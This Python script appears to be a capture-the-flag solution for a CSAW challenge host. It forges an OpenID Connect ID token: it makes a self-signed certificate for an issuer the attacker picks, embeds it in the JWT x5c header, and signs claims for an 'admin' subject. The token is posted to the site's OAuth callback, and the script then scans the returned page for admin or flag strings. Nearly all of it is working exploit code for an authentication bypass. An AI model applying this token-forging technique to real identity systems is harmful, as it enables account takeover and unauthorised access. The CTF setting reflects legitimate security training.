import base64, json, datetime, requests, sys
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography import x509
from cryptography.x509.oid import NameOID

B="https://dino2auth.ctf.csaw.io"

def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

iss = sys.argv[1] if len(sys.argv)>1 else "paleoid.example.com"
sub = sys.argv[2] if len(sys.argv)>2 else "admin"

key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, iss)])
# use fixed dates to avoid Date issues
nb = datetime.datetime(2026,1,1)
na = datetime.datetime(2027,1,1)
cert = (x509.CertificateBuilder().subject_name(name).issuer_name(name)
        .public_key(key.public_key()).serial_number(x509.random_serial_number())
        .not_valid_before(nb).not_valid_after(na)
        .sign(key, hashes.SHA256()))
der = cert.public_bytes(serialization.Encoding.DER)
x5c = base64.b64encode(der).decode()

header={"alg":"RS256","typ":"JWT","x5c":[x5c]}
payload={"iss":iss,"sub":sub,"aud":"trustdinoidc-portal",
         "scope":"openid profile freeosaurus:redeem","exp":1900000000}
signing = f"{b64u(json.dumps(header))}.{b64u(json.dumps(payload))}"
sig = key.sign(signing.encode(), padding.PKCS1v15(), hashes.SHA256())
tok = f"{signing}.{b64u(sig)}"
print("TOKEN:",tok[:60],"...")

s=requests.Session()
r=s.post(f"{B}/oauth/callback", data={"id_token":tok,"state":"x"}, allow_redirects=False)
print("callback status",r.status_code, r.headers.get("location"))
r2=s.get(f"{B}/")
import re
for line in r2.text.splitlines():
    if any(k in line.lower() for k in ["via ","admin","flagosaurus","csawctf","not an admin","member"]):
        print(">>",line.strip())
